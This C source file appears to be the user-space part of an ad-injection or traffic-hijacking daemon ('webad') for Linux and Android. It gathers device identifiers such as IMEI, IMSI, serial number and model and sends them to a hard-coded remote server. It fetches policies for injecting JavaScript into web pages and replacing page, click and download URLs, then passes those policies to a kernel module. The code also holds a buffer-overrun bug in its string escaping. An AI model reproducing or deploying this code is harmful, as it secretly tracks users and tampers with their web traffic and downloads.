#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <strings.h>
#include <errno.h>
#include <sys/types.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>
#include <math.h>
#include <ctype.h>
#include <netdb.h>
#include <math.h>
#include <time.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <linux/hdreg.h>
#include <net/if.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <semaphore.h>
#include <pthread.h>
#ifdef ANDROID
#include <android/log.h>
#include <sys/system_properties.h>
#include <cutils/properties.h>
#endif
#include "cjson.h"
#include "msocket.h"
#include "mnetlink.h"

enum 
{
    CMD_JS=0x01,
    CMD_CPC=0x02,
    CMD_PAGE_URL_REPLACE=0x04,
    CMD_DOWNLOAD_URL_REPLACE=0x08,
    CMD_MAX
};

#define MAX_POLICY_NUM 3
#define MAX_POLICY_SIZE 64
#define MAX_JS_SIZE 1024

#pragma pack (push)
#pragma pack(1)

struct policy_replace
{
    char src[MAX_POLICY_SIZE];
    char filter[MAX_POLICY_SIZE];
    char dst[MAX_POLICY_SIZE];
};

struct policy_cpc
{
    struct policy_replace cpc_replace;
    char is_add;
};

struct policy_buf
{
    char cmd;
    unsigned long reissue_time;//sec
    char js_rate;
    char js[MAX_JS_SIZE];//include<< web_polling_rule,web_polling_num,pub_key,media_type,phone_model,imei,imsi,network,version_name,version_code,os,os_type,android_version,android_id,vendor,serial,resolution
    char cpc_rate;
    char cpc_num;
    struct policy_cpc cpc[MAX_POLICY_NUM];
    char page_url_num;
    struct policy_replace page_url[MAX_POLICY_NUM];
    char download_url_num;
    struct policy_replace download_url[MAX_POLICY_NUM];
};


#pragma pack(pop)

static struct policy_buf gpy;

#define MAX_COMM_TIME_OUT 60
#define MAX_PARM_SIZE 250
#define MAX_BUF_SIZE 2048

struct sys_info
{
    char remote_ip[MAX_PARM_SIZE];
    int remote_port;
    char host[MAX_PARM_SIZE];
    int max_get_policy_timeout_sec;
    char pub_key[MAX_PARM_SIZE];
    char media_type[MAX_PARM_SIZE];
    char phone_model[MAX_PARM_SIZE];
    char plmn[MAX_PARM_SIZE];
    char network[MAX_PARM_SIZE];
    char version_name[MAX_PARM_SIZE];
    char version_code[MAX_PARM_SIZE];
    char is_system[MAX_PARM_SIZE];
    char is_sdk[MAX_PARM_SIZE];
    char os[MAX_PARM_SIZE];
    char os_type[MAX_PARM_SIZE];
    char android_version[MAX_PARM_SIZE];
    char android_id[MAX_PARM_SIZE];
    char vendor[MAX_PARM_SIZE];
    char serial[MAX_PARM_SIZE];
    char resolution[MAX_PARM_SIZE];
    char buildnum[MAX_PARM_SIZE];
    char imei[MAX_PARM_SIZE];
    char imsi[MAX_PARM_SIZE];
    char locale[MAX_PARM_SIZE];
    char fomart_js[MAX_BUF_SIZE];
    char fomart_http_head[MAX_BUF_SIZE];
    char fomart_http_content[MAX_BUF_SIZE];
    char registe[MAX_BUF_SIZE];
    char strategy[MAX_BUF_SIZE];
    char dzth[MAX_BUF_SIZE];
};

static struct sys_info gsi;

#ifndef ANDROID
void debug_log(const char *fmt, ...)
{
	va_list va;
	char timebuf[20];
	char info[2048];
	time_t timep;
	struct tm st_tm;
	FILE * logfp = NULL;
	va_start(va, fmt);
	struct stat statbuff;
    int max_debug_file_size=60*1024*1024;  //60M
    char* log_file_name="/var/log/webad.log";

	if(stat(log_file_name, &statbuff) >= 0)
	{  
		if(statbuff.st_size>=max_debug_file_size)
		{
			 remove(log_file_name);
		}
	}
	logfp = fopen(log_file_name, "a+");
	if (!logfp) {
		perror("fopen");
		return;
	}
	

	memset(timebuf, 0, sizeof(timebuf));
	

    time(&timep);
    localtime_r(&timep, &st_tm);

    sprintf(timebuf, "%04d-%02d-%02d %02d:%02d:%02d",
                         (1900 + st_tm.tm_year),
                         (1 + st_tm.tm_mon),
                         st_tm.tm_mday,
                         st_tm.tm_hour,
                         st_tm.tm_min,
                         st_tm.tm_sec);

	memset(info, 0, sizeof(info));
	vsnprintf(info, sizeof(info), fmt, va);

	fprintf(logfp,"%s-----: %s\n", timebuf, info);
	fflush(logfp);
	fclose(logfp);
	va_end(va);
	return;
}
#else

#define TAG "webad"
#define debug_log(...)  __android_log_print(ANDROID_LOG_DEBUG,TAG,__VA_ARGS__)

#endif


#ifndef ANDROID
#define REGISTE_FILE "/tmp/registe"
#else
#define REGISTE_FILE "/mnt/sdcard/registe"
#endif
int registe_file(char* type)
{
    FILE* fp;
	fp=fopen(REGISTE_FILE ,type);
	if(!fp)
	{		
		return -1;
	}
	fclose(fp);
    return 0;
}

static void replace_blank(char *str)
{
    int Clen=0;   
    int B_num=0; 
    char *p1=str;
    char *p2=str;
    int newlength=0;
    if(*str=='\0')
        return; 
    while(*p1!='\0')
    {
        p1++;
        Clen++;
        if(*p1==' ')
            ++B_num;
    }
     //cout<<"Clen="<<Clen<<"B_num="<<B_num<<endl;

     newlength=Clen+B_num*2;
     //cout<<newlength<<endl;
     p1=str+(Clen-1);
     p2=p2+(newlength-1);
	 str[newlength]='\0';
     //cout<<*p1<<endl;
     //cout<<*p2<<endl;
    for(;p1!=p2;p1--,p2--)
    {
        if(*p1==' ')
        { *p2='0';
           p2--;
          *p2='2';
           p2--;
          *p2='%'; }  
        else
            *p2=*p1;
    }
}

int get_sys_info()
{    
   
    memset(&gsi , '\0' , sizeof(struct sys_info));
    
    gsi.max_get_policy_timeout_sec=60;
    
    #if 0
        struct hostent *h;
        strcpy(gsi.host , "bus.dominoppo.in");
        if((h=gethostbyname(gsi.host))==NULL)
        {
            debug_log("can not get ip by host");
            return -1;
        }
        sprintf(gsi.remote_ip, inet_ntoa(*((struct in_addr *)h->h_addr)));
        gsi.remote_port=80;
    #else
        sprintf(gsi.remote_ip, "210.22.155.236");
        gsi.remote_port=8280;
        sprintf(gsi.host , "%s:%d" , gsi.remote_ip , gsi.remote_port);
    #endif
    
    
    strcpy(gsi.pub_key , "255V79");
    strcpy(gsi.media_type, "1");
    strcpy(gsi.network, "Wifi");
    strcpy(gsi.version_name, "1.0.0");
    strcpy(gsi.version_code, "100");
    strcpy(gsi.is_system, "3");
    strcpy(gsi.is_sdk, "0");
    strcpy(gsi.os, "20");
    strcpy(gsi.os_type, "21");

    //only in android
    strcpy(gsi.phone_model, "Micromax AQ5001");
    strcpy(gsi.plmn, "123456");
    strcpy(gsi.android_version, "5.0.1");
    strcpy(gsi.android_id, "1321564");
    strcpy(gsi.vendor, "5.0.1");
    strcpy(gsi.serial, "afefecef");
    strcpy(gsi.imei, "1234567890");
    strcpy(gsi.imsi, "0987654321");
    strcpy(gsi.resolution, "960*300");
    strcpy(gsi.locale, "en");
    #ifdef ANDROID
    property_get("ro.product.model", gsi.phone_model, "");
    property_get("gsm.sim.operator.imsi", gsi.imsi, "");
    property_get("ro.build.version.release", gsi.android_version, "");
    property_get("net.hostname", gsi.android_id, "");
    property_get("ro.product.manufacturer", gsi.vendor, "");
    property_get("ro.boot.serialno", gsi.serial, "");
    property_get("ro.build.display.id", gsi.buildnum, "");
    property_get("ro.product.locale.language", gsi.locale, ""); 
    #endif

    snprintf(gsi.fomart_js, MAX_BUF_SIZE, "%s^%s^%s^%s^%s^%s^%s^%s^%s^%s" ,
                            gsi.version_name , gsi.version_code , gsi.os,gsi.os_type,
                            gsi.android_version , gsi.android_id , gsi.vendor , gsi.serial ,gsi.resolution ,gsi.buildnum);

    
    snprintf(gsi.fomart_http_content,MAX_BUF_SIZE, "pub_key=%s&"
                        "media_type=%s&"
                        "phone_model=%s&"                    
                        "plmn=%s&"
                        "network=%s&"                                                                                                
                        "version_name=%s&"
                        "version_code=%s&"                        
                        "is_system=%s&"
                        "is_sdk=%s&"
                        "os=%s&"      
                        "os_type=%s&"                                                                        
                        "android_version=%s&"
                        "android_id=%s&"    
                        "vendor=%s&"
                        "serial=%s&"                                                                                                                        
                        "imei=%s&"
                        "imsi=%s&"
                        "locale=%s" , gsi.pub_key ,gsi.media_type , gsi.phone_model , gsi.plmn , gsi.network,
                        gsi.version_name , gsi.version_code , gsi.is_system ,gsi.is_sdk , gsi.os,gsi.os_type,
                        gsi.android_version , gsi.android_id , gsi.vendor , gsi.serial , gsi.imei , gsi.imsi ,gsi.locale);

    replace_blank(gsi.fomart_http_content);
    
    snprintf(gsi.fomart_http_head,MAX_BUF_SIZE, "pub_key: %s\r\n"
                    "media_type: %s\r\n"
                    "phone_model: %s\r\n"                    
                    "plmn: %s\r\n"
                    "network: %s\r\n"                                                                                                
                    "version_name: %s\r\n"
                    "version_code: %s\r\n"                        
                    "is_system: %s\r\n"
                    "is_sdk: %s\r\n"
                    "os: %s\r\n"      
                    "os_type: %s\r\n"                                                                        
                    "android_version: %s\r\n"
                    "android_id: %s\r\n"    
                    "vendor: %s\r\n"
                    "serial: %s\r\n"                                                                                                                        
                    "imei:%s\r\n"
                    "imsi:%s\r\n"
                    "locale:%s\r\n", gsi.pub_key ,gsi.media_type , gsi.phone_model , gsi.plmn , gsi.network,
                    gsi.version_name , gsi.version_code , gsi.is_system ,gsi.is_sdk , gsi.os,gsi.os_type,
                    gsi.android_version , gsi.android_id , gsi.vendor , gsi.serial , gsi.imei , gsi.imsi ,gsi.locale);

    snprintf(gsi.registe ,MAX_BUF_SIZE ,"POST /bus-webapi/rest/service/mzc?%s"                                                                                                                                                                                                                                   
                    " HTTP/1.1\r\n"
                    "Host: %s\r\n%s"                    
                    "\r\n" , gsi.fomart_http_content, gsi.host , gsi.fomart_http_head);
    
    snprintf(gsi.strategy,MAX_BUF_SIZE,"POST /bus-webapi/rest/service/strategy"                                                                                                                                                                                                                                   
                    " HTTP/1.1\r\n"
                    "Host:%s\r\n%s"                    
                    "\r\n" , gsi.host , gsi.fomart_http_head);

    snprintf(gsi.dzth,MAX_BUF_SIZE,"POST /bus-webapi/rest/service/dzth"                                                                                                                                                                                                                                   
                    " HTTP/1.1\r\n"
                    "Host: %s\r\n%s"                    
                    "\r\n" , gsi.host , gsi.fomart_http_head);
    debug_log("registe:%s" , gsi.registe);
    debug_log("strategy:%s" , gsi.strategy);
    debug_log("dzth:%s" , gsi.dzth);
    return 0;
}

char* remove_http_head(char* http)
{
    char* http_body=strstr(http , "\r\n\r\n");
    if(!http_body)
        return NULL;
    
    http_body+=4;
    if(strstr(http , "Transfer-Encoding: chunked"))
    {
        http_body = strstr(http_body , "\r\n");
        if(!http_body)
            return NULL;
        http_body+=2;
    }    
    return http_body;
}

int is_recv_ok(char* json)
{
    cJSON *root;
    root=cJSON_Parse(json);
    if(!root)
        return 0;
    cJSON *code = cJSON_GetObjectItem(root,"code");
    if(!code)
    {
        cJSON_Delete(root);
        return 0;
    }
    cJSON *message = cJSON_GetObjectItem(root,"message");
    if(!message)
    {
        cJSON_Delete(root);
        return 0;
    }
    if(!strcmp(code->valuestring , "200") && !strcmp(message->valuestring , "OK"))
    {        
        cJSON_Delete(root);
        return 1;
    }
    cJSON_Delete(root);
    return 0;
}

int parse_default(char* json)
{
    debug_log("parse default :%s" , json);
    return 0;
}

int parse_strategy(char *json)
{
    cJSON *root;
    root=cJSON_Parse(json);
    if(!root)
        return -1;
    cJSON *data = cJSON_GetObjectItem(root,"data");
    if(!data)
        goto out;
    cJSON *rdc = cJSON_GetObjectItem(data,"rdc");
    if(!rdc)
        goto out;
    cJSON *rdc_is_open = cJSON_GetObjectItem(rdc,"is_open");
    if(!rdc_is_open)
        goto out;
    cJSON *rdc_rate = cJSON_GetObjectItem(rdc,"rate");
    if(!rdc_rate)
        goto out;
    cJSON *rdd = cJSON_GetObjectItem(data,"rdd");
    if(!rdd)
        goto out;
    cJSON *rdd_is_open = cJSON_GetObjectItem(rdd,"is_open");
    if(!rdd_is_open)
        goto out;
    cJSON *rda = cJSON_GetObjectItem(data,"rda");
    if(!rda)
        goto out;
    cJSON *rda_is_open = cJSON_GetObjectItem(rda,"is_open");
    if(!rda_is_open)
        goto out;

    cJSON *web = cJSON_GetObjectItem(data,"web");
    if(!web)
        goto out;
    cJSON *web_polling_rule = cJSON_GetObjectItem(web,"polling_rule");
    if(!web_polling_rule)
        goto out;
    cJSON *web_url = cJSON_GetObjectItem(web,"web_url");
    if(!web_url)
        goto out;
    cJSON *web_is_open = cJSON_GetObjectItem(web,"is_open");
    if(!web_is_open)
        goto out;
    cJSON *web_rate = cJSON_GetObjectItem(web,"rate");
    if(!web_rate)
        goto out;
    cJSON *web_polling_num = cJSON_GetObjectItem(web,"polling_num");
    if(!web_polling_num)
        goto out;
    
    debug_log("strategy:%s---%s---%s---%s---%s---%s---%s---%s---%s" ,
        rdc_is_open->valuestring ,rdc_rate->valuestring ,rdd_is_open->valuestring,rda_is_open->valuestring,
        web_polling_rule->valuestring,web_url->valuestring,web_is_open->valuestring,web_rate->valuestring,web_polling_num->valuestring);
    
    if(!strcmp(web_is_open->valuestring , "1"))
    {
        gpy.cmd=gpy.cmd|0x01;
        gpy.js_rate = atoi(web_rate->valuestring);
        snprintf(gpy.js , MAX_JS_SIZE , "%s py=\"%s\" pn=\"%s\" data=\"%s\"", 
            web_url->valuestring , web_polling_rule->valuestring , web_polling_num->valuestring ,gsi.fomart_js);
    }
    if(!strcmp(rdc_is_open->valuestring , "1"))
    {
        gpy.cmd=gpy.cmd|0x02;
        gpy.cpc_rate= atoi(rdc_rate->valuestring);
    }
    if(!strcmp(rda_is_open->valuestring , "1"))
    {
        gpy.cmd=gpy.cmd|0x04;
    }
    if(!strcmp(rdd_is_open->valuestring , "1"))
    {
        gpy.cmd=gpy.cmd|0x08;
    }
    cJSON_Delete(root);
    return 0;
    out:
    cJSON_Delete(root);
    return -1;
}

int parse_dzth(char *json)
{
    cJSON *root;
    root=cJSON_Parse(json);
    if(!root)
        return -1;
    cJSON *data = cJSON_GetObjectItem(root,"data");
    if(!data)
    {
        goto out;
    }
    
    cJSON *cmlist = cJSON_GetObjectItem(data,"list");

    if(!cmlist)    
        goto out;

    int nCount = cJSON_GetArraySize ( cmlist );


    debug_log("nCount o %d .",nCount);
    if(nCount>=MAX_POLICY_NUM)
         goto out;

    
    gpy.page_url_num = nCount;
    cJSON* pArrayItem = NULL;

    int arrayCount = 0; 
    for(arrayCount = 0; arrayCount < nCount; arrayCount++)
    {
        pArrayItem = cJSON_GetArrayItem(cmlist, arrayCount);

        if(!pArrayItem)
        {
            goto out;
        }

        cJSON *source = cJSON_GetObjectItem(pArrayItem,"source");

        if(!source)
        {
            goto out;
        }	

        cJSON *target = cJSON_GetObjectItem(pArrayItem,"target");

        if(!target)
        {
            goto out;
        }	

        cJSON *filter = cJSON_GetObjectItem(pArrayItem,"filter");

        if(!filter)
        {
            goto out;
        }	
        
        debug_log("dzth: %s----%s---%s .\n",source->valuestring , target->valuestring ,filter->valuestring);
        strncpy(gpy.page_url[arrayCount].src,source->valuestring, MAX_POLICY_SIZE);
        strncpy(gpy.page_url[arrayCount].dst,target->valuestring, MAX_POLICY_SIZE);
        strncpy(gpy.page_url[arrayCount].filter,filter->valuestring, MAX_POLICY_SIZE);
    }
    
    
    cJSON_Delete(root);
    return 0;
    out:
    cJSON_Delete(root);
    return -1;
}

int get_data_from_remote(char* data , int len , int (*parse)(char*))
{
    char recv_buf[MAX_BUF_SIZE]={0};
    char* http_body=NULL;
       
    if(open_socket(gsi.remote_ip,gsi.remote_port)<=0)
    {
        debug_log("open_socket err\n");
        return -1;
    }
    if(-1==send_data(data,len))
    {
        debug_log("send err\n");
        return -1;
    }
    memset(recv_buf , '\0' , MAX_BUF_SIZE);
    if(-1==recv_data(recv_buf,MAX_BUF_SIZE))
    {
        debug_log("recv err\n");
        return -1;
    }       
    
    close_socket();
    http_body = remove_http_head(recv_buf);
    if(!is_recv_ok(http_body))
    {
        debug_log("is_recv_ok err\n");
        return -1;
    } 
    if(-1==parse(http_body))
    {
        debug_log("parse err\n");
        return -1;
    } 
    return 0;
}


int main(int argc, char *argv[])
{    
    while(1)
    {
        sleep(MAX_COMM_TIME_OUT);

        if(-1==get_sys_info())
            continue;
        break;
    }

    while(1)
    {
        sleep(MAX_COMM_TIME_OUT);
        
        //registe
        if(-1==registe_file("r"))
        {            
            if(-1==get_data_from_remote(gsi.registe, strlen(gsi.registe), parse_default))
                continue;//registe fail
            if(-1==registe_file("w"))
                continue;//registe fail
            debug_log("registe success");  
            break;
        }
        debug_log("haved registe");   
        break;
    }
    
    while(1)
    {        
        memset(&gpy , '0' , sizeof(struct policy_buf));

        sleep(MAX_COMM_TIME_OUT);
        
        //strategy
        if(-1==get_data_from_remote(gsi.strategy, strlen(gsi.strategy), parse_strategy))
            goto CONTINUE;
        
        sleep(MAX_COMM_TIME_OUT);
        
        //dzth
        if(gpy.cmd & 0x04)
            if(-1==get_data_from_remote(gsi.dzth, strlen(gsi.dzth), parse_dzth))
                goto CONTINUE;
        
        //send to kernel
        if(-1==open_netlink())
            goto CONTINUE;
        
        send_to_knl(&gpy,sizeof(struct policy_buf));
        close_netlink();
        
        CONTINUE:
            sleep(gsi.max_get_policy_timeout_sec);
            continue;
        
    }
    return 0;
}

